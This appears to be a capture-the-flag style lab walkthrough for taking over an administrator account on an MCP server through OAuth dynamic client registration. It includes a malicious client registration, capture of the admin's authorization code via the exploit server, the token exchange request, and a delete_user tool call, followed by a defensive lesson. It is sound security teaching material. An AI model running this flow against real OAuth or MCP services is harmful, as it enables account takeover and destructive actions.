---
layout: default
title: MCP OAuth Account Takeover via Dynamic Client Registration
permalink: /labs/mcp-oauth-account-takeover-dynamic-client-registration/
---

# MCP OAuth Account Takeover via Dynamic Client Registration

## Goal

Use the assigned lab's OAuth flow to obtain the administrator token, then delete `carlos` through `/mcp`.

## Walkthrough

1. Send an unauthenticated request to the lab's `/mcp` endpoint. Note the `resource_metadata` URL in the `WWW-Authenticate` response.
2. Open that protected-resource metadata document and follow its authorization-server URL. Read the authorization-server metadata to identify the lab's authorization, token, and dynamic-registration endpoints. Confirm that it requires PKCE with `S256`.
3. Open the lab's exploit server and copy its callback URL. Register a public authorization-code client using the lab's dynamic-registration endpoint. The lab's intended values are:

   ```json
   {
     "redirect_uris":["https://<your-lab-exploit-server>/callback"],
     "client_name":"Shop Assistant",
     "token_endpoint_auth_method":"none",
     "grant_types":["authorization_code"],
     "response_types":["code"]
   }
   ```

   Save the returned `client_id`. Use the callback belonging to this lab's exploit server, not a third-party host.

4. Create a PKCE verifier and its S256 challenge. The verifier is a random URL-safe string; the challenge is the Base64URL-encoded SHA-256 digest of that verifier, with trailing `=` padding removed. Keep the verifier private for the token exchange.
5. Build an authorization URL from the discovered authorization endpoint. Include the registered `client_id`, the exact registered `redirect_uri`, `response_type=code`, the challenge, `code_challenge_method=S256`, and a fresh `state` value.
6. Put that URL in the assigned exploit server page and use its **Deliver exploit to victim** control. This lab simulates the administrator visit; do not use this flow outside the lab.
7. Open the exploit server's access log. The authorization server redirects the lab victim's authorization code to the registered callback. Copy the code from that lab request and check that the returned `state` matches the value you created.
8. Exchange the code at the discovered token endpoint. Use the same `client_id` and `redirect_uri`, and the verifier from step 4:

   ```http
   POST /oauth/token
   Content-Type: application/x-www-form-urlencoded

   grant_type=authorization_code
   &client_id=<registered_client_id>
   &code=<lab_authorization_code>
   &redirect_uri=<registered_callback>
   &code_verifier=<your_pkce_verifier>
   ```

   The response should contain the administrator access token.

9. Initialize `/mcp` with that token as a bearer credential and call the lab's `delete_user` tool for `carlos`:

   ```json
   {
     "jsonrpc":"2.0",
     "id":3,
     "method":"tools/call",
     "params":{"name":"delete_user","arguments":{"username":"carlos"}}
   }
   ```

10. The `Deleted carlos` result confirms completion.

## Why it works

The lab accepts an attacker-chosen redirect URI at registration and treats a matching display name as sufficient consent. PKCE does not fix that binding error: the lab authorization is issued to the malicious client and redirected to its callback.

## Defensive lesson

Validate redirect URIs and bind consent to the registered client identity, not its display name. PKCE is necessary for public clients, but it does not replace correct client registration and authorization checks.
